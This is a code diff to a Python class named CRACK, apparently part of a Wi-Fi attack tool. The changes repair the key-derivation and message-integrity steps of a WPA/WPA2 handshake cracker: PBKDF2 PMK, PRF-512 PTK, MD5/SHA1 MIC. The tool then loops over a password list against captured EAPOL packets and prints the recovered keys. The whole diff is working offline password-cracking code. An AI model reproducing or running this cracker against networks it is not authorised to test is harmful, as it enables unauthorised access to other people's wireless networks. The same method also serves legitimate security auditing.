@@ -171,7 +171,7 @@ class CRACK:
 		pktc    = pkts.get(3)
 		pktd    = pkts.get(4)
 
-		ap      = self.extract_sn_rc(pkt)[0]
+		ap      = self.extract_sn_rc(pktb)[0]
 
 		apbin   = binascii.a2b_hex(ap.replace(":", ""))
 		stbin   = binascii.a2b_hex(sta.replace(":", ""))
@@ -179,24 +179,24 @@ class CRACK:
 		anonce  = binascii.a2b_hex(binascii.hexlify(pkta.getlayer(Raw).load)[26:90].decode())
 		cnonce  = binascii.a2b_hex(binascii.hexlify(pktb.getlayer(Raw).load)[26:90].decode())
 
-		keydat  = min(apbin, stbin) + max(ap, stbin) + min(anonce, cnonce) + max(anonce, cnonce)
+		keydat  = min(apbin, stbin) + max(apbin, stbin) + min(anonce, cnonce) + max(anonce, cnonce)
 		version	= chr(pktb.getlayer(EAPOL).version)
 		dtype   = chr(pktb.getlayer(EAPOL).type)
 		dlen    = chr(pktb.getlayer(EAPOL).len)
 
 		payload = binascii.a2b_hex(
 					binascii.hexlify(
-						version+
-						dytpe+
-						self.__NULL+
-						dlen+
+						version.encode("utf-8")+
+						dtype.encode("utf-8")+
+						self.__NULL.encode("utf-8")+
+						dlen.encode("utf-8")+
 						binascii.a2b_hex(binascii.hexlify(pktb.getlayer(Raw).load)[:154].decode())+
-						self.__NULL * 16+
-						binascii.a2b_hex(binascii.hexlify(self.pkt_ii.getlayer(Raw).load)[186:].decode())
+						(self.__NULL * 16).encode("utf-8")+
+						binascii.a2b_hex(binascii.hexlify(pktb.getlayer(Raw).load)[186:].decode())
 					)
 				)
 
-		data    = version + dtype + self.__NULL + dlen + pktb.getlayer(Raw).load
+		data    = version.encode("utf-8") + dtype.encode("utf-8") + self.__NULL.encode("utf-8") + dlen.encode("utf-8") + pktb.getlayer(Raw).load
 
 		rtval = (keydat, payload, data)
 		return rtval
@@ -204,22 +204,32 @@ class CRACK:
 	def calculate_prf512(self, key, A, B):
 		blen = 64
 		i    = 0
-		R    = ''
+		R    = b''
+		
 		while i<=((blen*8+159)/160):
-			hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)
+			
+			hmacsha1 = hmac.new(
+						key, 
+						A.encode('utf-8') + chr(0x00).encode('utf-8') + B + chr(i).encode('utf-8'),
+						hashlib.sha1
+					)
+			
 			i+=1
-			R = R+hmacsha1.digest()
+			R += hmacsha1.digest()
+		
 		return R[:blen]
 
-	def compute(self, password, kdata):
+	def compute(self, password, kdata, payload, chash):
 		pmk  = PBKDF2(password, self.essid, 4096).read(32)
 		ptk  = self.calculate_prf512(pmk, self.__PKE, kdata)
 
-		mica = binascii.hexlify(hmac.new(ptk[0:16], self.payload, hashlib.md5).digest())
-		micb = binascii.hexlify(hmac.new(ptk__[0:16], self.payload, hashlib.sha1).digest()[:32])
+		mica = binascii.hexlify(hmac.new(ptk[0:16], payload, hashlib.md5).digest()).decode()
+		micb = binascii.hexlify(hmac.new(ptk[0:16], payload, hashlib.sha1).digest())[:32].decode()
 
-		
-		return True
+		if mica == chash:
+			return (pmk, ptk, mica)
+		if micb == chash:
+			return (pmk, ptk, micb)
 
 	def engage(self):
 		for sta in list(self.__EAPOLS.keys()):
@@ -236,10 +246,10 @@ class CRACK:
 			kdata   = rtval[0]
 			payload = rtval[1]
 			data    = rtval[2]
-			chash   = self.calculate_hash( sta, kdata )
+			chash   = self.calculate_hash( sta )
 
 			for password in self.passes:
-				cracked = self.compute(password)
+				cracked = self.compute(password, kdata, payload, chash)
 				if cracked:
 					pull.print(
 						"$",
@@ -248,7 +258,9 @@ class CRACK:
 						),
 						pull.GREEN
 					)
-					print(self.hexdump(password))
+					print(self.hexdump(cracked[0]))
+					print(self.hexdump(cracked[1]))
+					print(self.hexdump(cracked[2]))
 				else:
 					pull.print(
 						"*",
